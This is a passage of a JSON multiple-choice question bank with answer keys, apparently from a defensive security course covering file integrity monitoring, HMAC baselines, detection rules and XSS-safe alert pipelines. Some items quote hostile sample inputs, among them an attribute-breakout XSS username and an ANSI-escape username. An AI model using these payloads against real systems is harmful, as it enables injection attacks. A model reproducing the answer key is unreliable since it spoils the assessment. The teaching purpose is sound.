      "`html.escape(entity, quote=True)` producing `&lt;script&gt;fetch(&#x27;...` — visually showing the analyst the exact script attempt as inert text without executing it",
      "Running `sanitise(entity)` alone without `html.escape()`",
      "Saving raw unescaped strings inside `<div class='safe'>`"
    ],
    "correct": 1,
    "explanation": "Contextual HTML escaping preserves complete forensic fidelity (`what payload the adversary tried`) while neutralizing browser code execution completely."
  },
  {
    "id": "q_c4_m7_133",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "medium",
    "q": "Why should SOC automation avoid putting secrets (`--key-file` contents, webhook API tokens) inside command-line CLI flags (`--hmac-secret supersecret`)?",
    "options": [
      "Process listings (`ps aux`, Task Manager, `/proc/pid/cmdline`, auditd `4688`) expose CLI arguments in plaintext to other local users and logs",
      "`argparse` truncates flags over 16 bytes",
      "HMAC keys contain hyphens rejected by `argparse`",
      "Command-line arguments automatically write into `alerts.jsonl`"
    ],
    "correct": 0,
    "explanation": "Passing secrets via protected `--key-file` paths (`0400` permissions) or restricted secret stores avoids leaking credentials into host process trees and audit logs."
  },
  {
    "id": "q_c4_m7_134",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "difficult",
    "q": "Suppose your organization ships logs to an off-host collector, runs `fim.py check` via cron every 15 minutes, AND monitors heartbeats via a dead-man's switch alerting after 35 minutes of silence. An intruder kills `cron` at 02:00. What happens at 02:36?",
    "options": [
      "The intruder's webshell self-deletes",
      "The dead-man check stays silent until the intruder restores `cron`",
      "`fim.py` prints exit `0` locally to disk",
      "The off-host dead-man's switch detects missing signed check-ins exceeding 35 minutes and raises a tamper/outage alert to on-call responders"
    ],
    "correct": 3,
    "explanation": "Dead-man heartbeat monitoring closes the blind spot created when an intruder disables host agents."
  },
  {
    "id": "q_c4_m7_135",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "Why does `m07_defensive.py`'s `compare(old, new)` sort all three output lists (`added`, `removed`, `modified`)?",
    "options": [
      "`json.dumps()` fails on unsorted lists",
      "Python sets cannot return lists without `sorted()`",
      "Set operations (`-`, `&`) iterate in arbitrary hash-table order in Python; sorting ensures deterministic, human-readable diff reports and stable unit assertions",
      "`sorted()` verifies file creation timestamps"
    ],
    "correct": 2,
    "explanation": "Set iteration order varies per Python process due to hash randomization (`PYTHONHASHSEED`); sorting stabilizes output across runs."
  },
  {
    "id": "q_c4_m7_136",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "Suppose a directory contains 2 files (`a.txt` with `hash1`, `b.txt` with `hash2`). Next, someone renames `a.txt` to `a_old.txt` without changing bytes. How does path-keyed `compare(old, new)` report this rename?",
    "options": [
      "`modified=['a.txt'], added=[], removed=[]`",
      "`added=['a_old.txt'], removed=['a.txt'], modified=[]`",
      "`added=[], removed=[], modified=[]` (no change because hashes match)",
      "`added=['a.txt'], removed=['a_old.txt'], modified=[]`"
    ],
    "correct": 1,
    "explanation": "Renames delete the old path key from `new.keys()` and introduce the renamed key in `new.keys()`, appearing symmetrically in `removed` and `added`."
  },
  {
    "id": "q_c4_m7_137",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "Which standard-library function verifies the baseline HMAC signature inside `m07_defensive.py`?",
    "options": [
      "`hmac.compare_digest(sign(loaded['files'], key), loaded['sig'])`",
      "`loaded['sig'] == hashlib.sha256(key)`",
      "`json.compare(loaded['sig'])`",
      "`secrets.compare(loaded['sig'], key)`"
    ],
    "correct": 0,
    "explanation": "`hmac.compare_digest` executes fixed-length constant-time equality verification over expected and stored hex signatures."
  },
  {
    "id": "q_c4_m7_138",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "In `baseline.json`, if a developer forgot `sort_keys=True` in `sign()` AND two files `'b.conf'` and `'a.conf'` were inserted into `old` in reverse order on host rebuild, what intermittent bug breaks production alerting?",
    "options": [
      "Python's `dict` drops keys not inserted alphabetically",
      "`hashlib.sha256` alternates hex case randomly",
      "`hmac.new` truncates unsorted keys",
      "Valid unmodified baselines fail HMAC verification purely because `json.dumps` serialized keys in a different order (`b` before `a` vs `a` before `b`)"
    ],
    "correct": 3,
    "explanation": "Python preserves dict insertion order; without canonical `sort_keys=True`, logically equal dictionaries serialize to distinct HMAC inputs."
  },
  {
    "id": "q_c4_m7_139",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "Look at `m07_defensive.py`'s `LOG`: why did `svc\\x1b[31mbackup` trigger rule `RK-003`?",
    "options": [
      "It triggered `RK-001` due to `UID=1001`",
      "It appeared in 3 consecutive `sudo` failures",
      "It appeared in a `useradd[42]: new user: name=svc\\x1b[31mbackup, UID=1001` line matching `RK-003` (`threshold=1`)",
      "Any username containing `svc` always raises an alert"
    ],
    "correct": 2,
    "explanation": "Local account creation (`useradd`) is security-critical (`threshold=1`), firing immediately even with embedded ANSI attack strings."
  },
  {
    "id": "q_c4_m7_140",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "Examine `RK-003` pattern: `r'useradd\\[\\d+\\]: new user: name=(?P<user>[^,]+)'`. What if a system creates a valid username containing no commas, e.g. `backup_svc`, followed cleanly by `, UID=1001, GID=1001`—why does `[^,]+` stop safely instead of over-matching?",
    "options": [
      "`\\d+` consumes `, UID=1001` automatically",
      "Negated character class `[^,]+` refuses to cross `,`, matching only `backup_svc` rather than extending greedily to the end of the line",
      "Because `name=` is anchored with `$`",
      "Because Python `re` stops greedy loops at colons"
    ],
    "correct": 1,
    "explanation": "Explicit boundary-aware negated classes (`[^,]+`) extract exact delimited values cleanly without regex backtracking bloat."
  },
  {
    "id": "q_c4_m7_141",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "In `m07_defensive.py`, when `RK-002` emits Alert 2 at offset `+30s`, what value gets stored inside `last_alert[('RK-002', 'ben')]`?",
    "options": [
      "The timestamp `t` (`2026-11-07T10:00:30+00:00`) at which Alert 2 actually fired",
      "The threshold integer `3`",
      "The first failure timestamp `+20s`",
      "`None`"
    ],
    "correct": 0,
    "explanation": "Suppression measures elapsed cooldown starting from the moment the alert was emitted (`+30s`), not the initial single-event failure (`+20s`)."
  },
  {
    "id": "q_c4_m7_142",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "Suppose a team moves an internal vulnerability scanner to a new scheduled scan window and `RK-002` or failed-login thresholds suddenly alert constantly at 02:00 AM. Rather than silencing the entire detection rule globally, what is the cleaner engineering adjustment?",
    "options": [
      "Switch from `utc` timestamps to local strings",
      "Delete all authentication logs on the target hosts",
      "Raise thresholds to `1,000,000`",
      "Suppress or route known authorized scanner IPs explicitly with scoped documented allow-rules and tight scheduling bounds while keeping unauthorized failures active"
    ],
    "correct": 3,
    "explanation": "Documented, scoped exception policies preserve full visibility over unapproved sources without creating blind spots."
  },
  {
    "id": "q_c4_m7_143",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "In `C04-M07-F3` (Safe Alert Pipeline), why do defensive emitters inspect error and alert strings against token/password patterns before writing JSONL or webhooks?",
    "options": [
      "To reduce JSON line length under 80 bytes",
      "Because HMAC-SHA256 refuses strings containing `password`",
      "To enforce secret redaction (`Bearer [REDACTED]`), ensuring alert payloads never leak API keys or user credentials into broad SOC tickets",
      "Because `html.escape()` deletes secrets automatically"
    ],
    "correct": 2,
    "explanation": "OWASP Logging guidelines require scrubbing credentials, tokens, and session cookies out of telemetry outputs."
  },
  {
    "id": "q_c4_m7_144",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Consider `sanitise(text, limit=80)` applied to a `200`-character username `('A' * 195) + '\\x1b[31m'`. In what order do `re.sub(...)` and `[:limit]` execute inside `re.sub(r'[\\x00-\\x1f\\x7f]', '?', text)[:limit]`?",
    "options": [
      "`[:80]` truncates BEFORE `re.sub` scans",
      "`re.sub(...)` replaces control characters first across the whole string, then `[:80]` slices to 80 characters (note: if slicing ran over multi-kilobyte log lines, slicing a bounded ceiling before regex can also bound regex CPU time)",
      "Both operations execute simultaneously on `list` tokens",
      "Slicing reverts `?` back to `\\x1b`"
    ],
    "correct": 1,
    "explanation": "Python evaluates `re.sub(...)` first, then applies `[:limit]`; enforcing an outer input line limit (`MAX_LINE = 2048`) further guards regex performance."
  },
  {
    "id": "q_c4_m7_145",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "medium",
    "q": "Why must an off-host SIEM or collector store shipped alerts in an **append-only** manner from the perspective of monitored endpoints?",
    "options": [
      "So a compromised endpoint sensor can write new logs/alerts but cannot overwrite or erase earlier intrusion evidence",
      "Append-only files compress faster with `gzip`",
      "Python's `json.loads()` only reads append-only file handles",
      "Append-only mode disables `timedelta` checks"
    ],
    "correct": 0,
    "explanation": "Write-once / append-only remote telemetry prevents intruders who obtain host root from scrubbing tracks cleanly."
  },
  {
    "id": "q_c4_m7_146",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "difficult",
    "q": "Look at Practical P1 & P2 combined: suppose an administrator runs `python fim.py check /srv/app` as a scheduled job while accidentally omitting `--key-file`. What must the script do to satisfy secure fail-closed engineering?",
    "options": [
      "Return `exit 0` so cron reports no findings",
      "Default to a hardcoded string `b'default-key'` and continue silently",
      "Generate a brand-new random `secrets.token_bytes(32)` and resign `baseline.json` automatically",
      "Abort cleanly with an explicit non-zero error status (`exit 2`) noting the missing key requirement rather than silently running an unsigned check and returning `0`"
    ],
    "correct": 3,
    "explanation": "Fail-closed automation never degrades silently into insecure unsigned verification or fabricated keys."
  },
  {
    "id": "q_c4_m7_147",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "In `m07_defensive.py`, what two initial sample files populate the synthetic monitored folder before tampering occurs?",
    "options": [
      "`cron.evil` and `sample_auth.log`",
      "`baseline.json` and `alerts.jsonl`",
      "`hosts` and `sshd_config`",
      "`index.php` and `rules.json`"
    ],
    "correct": 2,
    "explanation": "Verified execution prints `1. baseline files: ['hosts', 'sshd_config']` cleanly."
  },
  {
    "id": "q_c4_m7_148",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "If `base = snapshot(root)` creates `baseline.json` INSIDE `root` itself before taking `now = snapshot(root)`, what spurious noise immediately pollutes `compare(base, now)`?",
    "options": [
      "`sha256` fails when hashing `.json` files",
      "`baseline.json` itself shows up in `'added'`, and re-writing or signing it mutates the monitored tree on every scan",
      "`baseline.json` merges silently with `hosts`",
      "Nothing happens because `.rglob('*')` skips `.json` files"
    ],
    "correct": 1,
    "explanation": "Beyond Tamarind Travels security flaws, placing baseline files inside the monitored target directory contaminates `snapshot()` measurements directly."
  },
  {
    "id": "q_c4_m7_149",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "Does `hmac.new(key, blob, hashlib.sha256).hexdigest()` encrypt `baseline.json` so attackers cannot read which files exist on the host?",
    "options": [
      "No — HMAC ensures integrity and authenticity (detecting unauthorized edits), while the JSON file list remains readable plaintext",
      "Yes — HMAC-SHA256 encrypts all keys with AES-GCM",
      "Yes — `sort_keys=True` scrambles keys cryptographically",
      "Only when `key` exceeds 64 bytes"
    ],
    "correct": 0,
    "explanation": "HMAC is a Message Authentication Code (tamper detection), not encryption (confidentiality)."
  },
  {
    "id": "q_c4_m7_150",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "In `m07_defensive.py`, suppose someone copies a genuine historical `baseline.json` (signed last year when `sshd_config` had weak legacy settings) and swaps it back onto the server (**rollback/replay attack**). Does plain `hmac.compare_digest(sign(raw['files'], key), raw['sig'])` detect the rollback?",
    "options": [
      "Yes — `json.loads` rejects older `baseline.json` files",
      "Yes — `hmac.compare_digest` expires signatures after 24 hours automatically",
      "Yes — `sort_keys=True` embeds the system clock implicitly",
      "Not by itself if the old file bears a valid signature under the same key — defending against rollback also requires embedding a monotonic timestamp/version inside the signed payload and storing authoritative baselines off-host"
    ],
    "correct": 3,
    "explanation": "Valid signatures from prior versions remain cryptographically valid under the same key unless baselines include signed monotonic epochs or live off-host."
  },
  {
    "id": "q_c4_m7_151",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "Why does Practical P2 suggest testing `Invalid user` / `Failed password for invalid user (?P<user>\\S+)` rules in `rules.json` cleanly against both valid and invalid-user log lines?",
    "options": [
      "Because `RK-001` handles failed logins by default",
      "Because `sudo` always prints `'invalid user'`",
      "To verify the pattern captures the real username (`admin`) cleanly rather than missing lines or mis-capturing the literal word `'invalid'`",
      "To increase CPU load during tests"
    ],
    "correct": 2,
    "explanation": "Different OpenSSH messages insert `'invalid user '` dynamically; positive and negative fixtures ensure the right capture value is extracted."
  },
  {
    "id": "q_c4_m7_152",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "Look at the expression `(m.groupdict().get('ip') or m.groupdict().get('user') or '-')`. What subtle trap arises if a rule adds a regex group literally named `(?P<host>...)` without updating the extractor logic?",
    "options": [
      "`groupdict()` raises `KeyError: 'host'`",
      "`host` stays ignored and keys collapse under generic entity `'-'`, merging alerts across completely unrelated hosts",
      "Python treats `'host'` as `'ip'` automatically",
      "`threshold` resets to `1`"
    ],
    "correct": 1,
    "explanation": "Declarative schemas must either define a supported `entity_field` in the rule metadata or explicitly validate allowed named capture groups at startup."
  },
  {
    "id": "q_c4_m7_153",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "Which rule IDs fire and at what approximate relative timestamps during `m07_defensive.py` execution?",
    "options": [
      "`RK-001` at `+0s`, `RK-002` at `+30s` (with `+31s` & `+40s` suppressed), and `RK-003` at `+90s`",
      "`RK-001` at `+20s`, `RK-002` at `+40s`, and `RK-003` at `+90s`",
      "`RK-002` at `+20s` and `RK-001` at `+90s`",
      "`RK-003` at `+0s` only"
    ],
    "correct": 0,
    "explanation": "Root login (+0s), third sudo failure for `ben` (+30s), and malicious `useradd` (+90s) produce the 3 verified alerts."
  },
  {
    "id": "q_c4_m7_154",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "In `Scenario S2`, why does suppressing duplicates *inside* an application crash loop fail to protect a disk unless log ingestion or rule output also caps volume safely?",
    "options": [
      "Rate limiting only affects HTTP endpoints",
      "Suppression doubles raw log disk usage automatically",
      "`SUPPRESS` converts JSON files into binary files",
      "Suppression drops duplicate *alerts*, yet writing massive debug dumps or unbounded in-memory failure deques per host without eviction or rate caps can still exhaust local memory/disk"
    ],
    "correct": 3,
    "explanation": "Clean alert pipelines combine bounded deques/windows in RAM with alert suppression and log rotation on disk."
  },
  {
    "id": "q_c4_m7_155",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "Which standard-library Python function prevents stored XSS when building an HTML summary table in Practical P2?",
    "options": [
      "`re.sub(r'[\\x00-\\x1f\\x7f]', '?', value)`",
      "`json.dumps(value, ensure_ascii=True)`",
      "`html.escape(value, quote=True)`",
      "`hmac.compare_digest(value, value)`"
    ],
    "correct": 2,
    "explanation": "`html.escape` neutralizes HTML tags and attribute breakouts safely in HTML templates."
  },
  {
    "id": "q_c4_m7_156",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Suppose an attacker sends a username `'admin\" onclick=\"alert(1)'` inside an HTML attribute like `<td title=\"ENTITY\">` rendered via f-string, and the developer called `html.escape(entity, quote=False)`. What security vulnerability survives cleanly?",
    "options": [
      "Zero vulnerability because `<` and `>` were escaped",
      "Attribute-injection XSS: `quote=False` leaves double quotes `\"` unescaped, letting the attacker break out of `title=\"...\"` and attach `onclick=\"alert(1)`",
      "`quote=False` turns `onclick` into `&lt;onclick&gt;`",
      "`title` attributes cannot trigger JavaScript"
    ],
    "correct": 1,
    "explanation": "Always keep `quote=True` (the default in Python's `html.escape`) so both double quotes (`&quot;`) and single quotes (`&#x27;`) stay neutralized in attributes too."
  },
  {
    "id": "q_c4_m7_157",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "medium",
    "q": "In a Detection-as-Code pipeline (`Practical P2`), when a developer edits an exclusion glob in FIM or modifies a detection regex in `rules.json`, what must happen before deploying to production?",
    "options": [
      "Run schema validation, positive known-bad tests, negative known-good tests, and pipeline escaping tests automatically in CI",
      "Deploy directly over SSH during peak business hours",
      "Manually eyeball `rules.json` without running code",
      "Reset all existing HMAC keys"
    ],
    "correct": 0,
    "explanation": "Automated test gates verify that changes detect intended threats without false alarms or schema breakage before touching production hosts."
  },
  {
    "id": "q_c4_m7_158",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "difficult",
    "q": "Why should a scheduled Linux cron/systemd service running `fim.py check` pipe errors to `systemd-journald` / off-host syslog rather than sending unauthenticated emails full of full host paths and tracebacks?",
    "options": [
      "Email bodies truncate at 80 characters",
      "Cron deletes any script that raises `PermissionError`",
      "`journald` automatically computes HMAC signatures",
      "Encrypted/authenticated log shipping protects sensitive config structures and avoids leaking internal stack traces over plaintext or broad mail relays"
    ],
    "correct": 3,
    "explanation": "Controlled structured operator logging avoids accidentally spilling sensitive tracebacks or credentials across insecure mail channels."
  },
  {
    "id": "q_c4_m7_159",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "In `compare(old, new)`, how are `'modified'` files computed?",
    "options": [
      "`sorted(new.keys() - old.keys())`",
      "`sorted(old.keys() | new.keys())`",
      "`sorted(k for k in old.keys() & new.keys() if old[k] != new[k])`",
      "`sorted(old.keys() ^ new.keys())`"
    ],
    "correct": 2,
    "explanation": "Intersection `old.keys() & new.keys()` finds surviving paths whose values changed (`old[k] != new[k]`)."
  },
  {
    "id": "q_c4_m7_160",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "Suppose `compare(old, new)` receives baseline dictionaries storing `{path: {'sha256': ..., 'size': ..., 'mtime': ...}}` (Practical P1). If someone touches a sensitive file's `mtime` without altering file content bytes (`old['sha256'] == new['sha256']` while `mtime` changed), should `compare` trigger a high-severity *content modification* alarm or distinguish metadata drift cleanly?",
    "options": [
      "Ignore metadata completely and return clean even if permissions changed to `0777`",
      "Distinguish hash-content modifications (high severity) from metadata-only drift (`mtime` changed, `sha256` identical) so operators spot timestamp-stomping clues without confusing them with payload alteration",
      "Classify metadata drift as `'removed'`",
      "Re-sign the baseline automatically"
    ],
    "correct": 1,
    "explanation": "Separating cryptographic digest diffs from metadata/permission changes gives responders clear forensic context (`metadata changed vs content tampered`)."
  },
  {
    "id": "q_c4_m7_161",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "What value did `m07_defensive.py` output on line 2 of Step 1 verifying the genuine baseline before tampering?",
    "options": [
      "`baseline signature valid: True`",
      "`tampered baseline valid: True`",
      "`cleaned up: False`",
      "`baseline verified: 0`"
    ],
    "correct": 0,
    "explanation": "Genuine verification printed `baseline signature valid: True`, whereas post-tampering verification printed `tampered baseline valid: False`."
  },
  {
    "id": "q_c4_m7_162",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "If `sign(data, key)` calls `.encode('utf-8')` on `json.dumps(data, sort_keys=True)`, why could leaving `ensure_ascii=False` inside `json.dumps` alongside inconsistent Unicode normalization (`NFC` vs `NFD` filenames on macOS APFS vs Linux) cause unexpected HMAC mismatches across hosts unless handled cleanly?",
    "options": [
      "Because `sort_keys=True` forces ASCII-only filenames",
      "Because UTF-8 does not encode ASCII characters",
      "Because `hmac.new()` rejects strings above `U+007F`",
      "Different Unicode byte sequences for accented filenames (or `ensure_ascii=True` vs `False`) produce distinct raw bytes, whereas default `ensure_ascii=True` escapes all non-ASCII code points deterministically once normalized"
    ],
    "correct": 3,
    "explanation": "Python's default `ensure_ascii=True` inside `json.dumps` produces canonical 7-bit ASCII bytes, stabilizing serialization cleanly."
  },
  {
    "id": "q_c4_m7_163",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "Look at `RK-002` in `m07_defensive.py`: `'threshold': 3, 'severity': 'medium'`. Why wasn't `'RK-002'` configured with `threshold: 1` like `'RK-001'`?",
    "options": [
      "Python sets cannot hold thresholds of `1` for medium rules",
      "`sudo` only logs failures once every three runs",
      "Occasional single-mistype `sudo` passwords happen normally among admins, whereas repeated failures suggest unauthorized guessing or script abuse",
      "`RK-002` only captures IPs"
    ],
    "correct": 2,
    "explanation": "Thresholds balance detection sensitivity against normal administrative human mistakes."
  },
  {
    "id": "q_c4_m7_164",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "What occurs if an external `rules.json` file specifies a duplicate `'id'` across two entries (`'RK-002'` used twice for two different regex patterns)?",
    "options": [
      "`re.compile` merges both patterns into one regex",
      "Both rules collide silently under composite `counts[('RK-002', entity)]` and `last_alert[('RK-002', entity)]`, causing threshold mixing and unintended cross-rule suppression unless startup validation rejects duplicate rule IDs",
      "`json.load()` raises `KeyError` automatically on duplicate string values",
      "The second rule increments `threshold` by 1"
    ],
    "correct": 1,
    "explanation": "Rule loader validation should explicitly assert unique rule IDs (`len(ids) == len(rules)`) before launching detection."
  },
  {
    "id": "q_c4_m7_165",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "What mathematical inequality triggers duplicate suppression in `m07_defensive.py`?",
    "options": [
      "`prev is not None and (t - prev) < SUPPRESS`",
      "`prev is None or (t - prev) >= SUPPRESS`",
      "`counts[key] < rule['threshold']`",
      "`t == prev`"
    ],
    "correct": 0,
    "explanation": "If a previous alert exists within `< SUPPRESS`, the rule engine mutes duplicate alert emission."
  },
  {
    "id": "q_c4_m7_166",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "Suppose `m07_defensive.py` adds suppression AND wants to show SOC responders how long each burst lasted. Why should `last_alert` store the most recent *emitted alert time* cleanly rather than overwriting `last_alert[key] = t` during suppressed matches (`+31s`, `+40s`)?",
    "options": [
      "Because `SUPPRESS` shrinks to zero on overwrite",
      "Overwriting raises `RuntimeError: dictionary changed size`",
      "Because `t` at `+31s` is naive",
      "Overwriting `last_alert` on suppressed events creates a sliding reset where continuous slow failures silence the alert *forever* without ever re-notifying after 10 minutes"
    ],
    "correct": 3,
    "explanation": "Sliding reset on suppressed events could mute an active 24-hour attack permanently after just the first alert; cooldown must measure strictly from the last emitted alert."
  },
  {
    "id": "q_c4_m7_167",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "Why does `m07_defensive.py` use `re.sub(r'[\\x00-\\x1f\\x7f]', '?', text)` instead of `text.strip()`?",
    "options": [
      "`strip()` removes brackets like `[31m`",
      "`strip()` raises `ValueError` on `\\x1b`",
      "`str.strip()` only removes whitespace at string ends, leaving embedded `\\x1b` ANSI escapes, internal `\\n` newlines, and `\\x00` null bytes completely intact inside the middle",
      "`re.sub` works faster than `strip()` on whitespace"
    ],
    "correct": 2,
    "explanation": "Targeted control-byte substitution removes internal control sequences (`svc\\x1b[31mbackup`) that `.strip()` misses completely."
  },
  {
    "id": "q_c4_m7_168",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Notice that `alerts.jsonl` in `m07_defensive.py` uses **JSON Lines** (`.jsonl`) rather than writing one giant JSON array (`[...]`) modified every time an alert fires. Why do log and alert emitters favor `.jsonl`?",
    "options": [
      "JSON arrays cannot hold more than 3 objects in Python",
      "Appending one `json.dumps(alert) + '\\n'` line is O(1) crash-safe without rewriting the entire file or breaking syntax on sudden termination",
      "Only `.jsonl` supports `ensure_ascii=True`",
      "`json.loads()` reads whole `.jsonl` files in one call automatically"
    ],
    "correct": 1,
    "explanation": "JSON Lines supports streaming append-only writes and line-by-line processing without holding huge arrays in RAM or corrupting closing brackets on crashes."
  },
  {
    "id": "q_c4_m7_169",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "medium",
    "q": "Which of these is a red flag when maintaining FIM exclusion lists (`--exclude`) on production servers?",
    "options": [
      "Adding broad code wildcard exclusions like `'*.py'`, `'*.php'`, or `'*.sh'` just to quiet developer push noise instead of automating controlled `accept` steps",
      "Excluding `/var/log/app/*.log` after confirming logs live outside executable dirs",
      "Running `fim.py check` under a dedicated read-only user",
      "Alerting centrally if `baseline.json` changes outside maintenance hours"
    ],
    "correct": 0,
    "explanation": "Blanket exclusion of executable extensions creates trivial attacker blind spots."
  },
  {
    "id": "q_c4_m7_170",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "difficult",
    "q": "In `Practical P1`, suppose an organization schedules `python fim.py check` every 10 minutes over a huge `/usr` + `/var/www` tree containing a `30 GiB` read-only media archive. How does separating mutable/large static archives and using chunked `64 KiB` SHA-256 reads prevent overlapping cron storms?",
    "options": [
      "Because SHA-256 hashes only file headers past 64 KiB",
      "`iter(..., b'')` automatically skips files larger than 1 GiB",
      "Cron stops subsequent launches automatically via `hmac`",
      "Keeping huge static media out of sub-10-minute FIM sweeps (or isolating separate daily jobs with bounded locking/timeouts) stops scan duration from exceeding the 10-minute interval and piling up concurrent Python workers"
    ],
    "correct": 3,
    "explanation": "Bounding scan scope, separating heavy static media archives from critical config sweeps, and adding execution lock/timeout controls prevents overlapping resource exhaustion."
  },
  {
    "id": "q_c4_m7_171",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "What three lists appear in the dictionary returned by `compare(old, new)` inside `m07_defensive.py`?",
    "options": [
      "`'low'`, `'medium'`, and `'high'`",
      "`'created'`, `'unchanged'`, and `'tampered'`",
      "`'added'`, `'removed'`, and `'modified'`",
      "`'files'`, `'sig'`, and `'alerts'`"
    ],
    "correct": 2,
    "explanation": "`compare()` explicitly returns sorted `'added'`, `'removed'`, and `'modified'` path lists."
  },
  {
    "id": "q_c4_m7_172",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "Why must a Windows-compatible snapshot script watch out for **case sensitivity differences** (`SSHD_CONFIG` vs `sshd_config`) when comparing snapshots across NTFS and Linux filesystems?",
    "options": [
      "Python `dict` treats lowercase and uppercase keys identically on Windows",
      "Windows NTFS is typically case-preserving yet case-insensitive, whereas Python dictionary keys compare case-sensitively unless paths are canonicalized intentionally for cross-OS consistency",
      "SHA-256 ignores filename casing inside file contents",
      "`.replace('\\\\', '/')` forces lowercase automatically"
    ],
    "correct": 1,
    "explanation": "Linux paths treat `Config` and `config` as distinct files; preserving exact case on Linux while understanding Windows case-folding avoids subtle diff surprises."
  },
  {
    "id": "q_c4_m7_173",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "Why did Case Study C04-M07-CS2 (Tamarind Travels) recommend storing the signing key separately from the web server host?",
    "options": [
      "Even if attackers achieve remote code execution as the web application user, they cannot forge valid HMAC tags for malicious baselines without possessing the off-host key",
      "Because storing keys off-host cuts SHA-256 computation time in half",
      "Because `www-data` cannot parse JSON files",
      "To allow automatic unauthenticated `accept` runs on the webserver"
    ],
    "correct": 0,
    "explanation": "Separating key custody out of the attacker's compromise domain preserves baseline authenticity."
  },
  {
    "id": "q_c4_m7_174",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "Examine `baseline = {'files': base, 'sig': sign(base, key)}`. Suppose an attacker alters `'files': {}` (empty dict) AND leaves `'sig'` unchanged. Why does `verify` still fail cleanly?",
    "options": [
      "`json.loads` skips empty dictionaries",
      "`{}` is falsy so Python throws `ZeroDivisionError`",
      "`hmac.compare_digest` rejects empty dictionaries explicitly without hashing",
      "`sign({}, key)` computes HMAC over UTF-8 `b'{}'`, which does not match the stored `sig` over the original multi-file dictionary"
    ],
    "correct": 3,
    "explanation": "Replacing the entire manifest with an empty dict fails signature verification just as strongly as modifying one byte."
  },
  {
    "id": "q_c4_m7_175",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "Which standard-library exception should a startup JSON rule loader catch when checking whether `rule['pattern']` compiles safely?",
    "options": [
      "`html.HTMLParseError`",
      "`FileNotFoundError`",
      "`re.error` (reporting the failing rule ID clearly and exiting cleanly with status `2`)",
      "`hmac.HMACException`"
    ],
    "correct": 2,
    "explanation": "Catching `re.error` on invalid regex syntax surfaces clear diagnostics to rule authors without noisy Python tracebacks."
  },
  {
    "id": "q_c4_m7_176",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "Suppose an author writes rule `RK-005` cleanly in `rules.json`, tests it on 5 lines locally, and forgets an edge case where an IPv6 address `2001:db8::1` appears in SSH logs (`from (?P<ip>[0-9.]+)`). What silently fails in production?",
    "options": [
      "`re.search` logs a warning on colons automatically",
      "IPv6 attackers bypass `RK-005` silently with zero errors because `[0-9.]+` rejects colons and hex letters `a–f`",
      "IPv6 translates into IPv4 implicitly before `read_events`",
      "`sanitise` drops IPv6 colons as control bytes"
    ],
    "correct": 1,
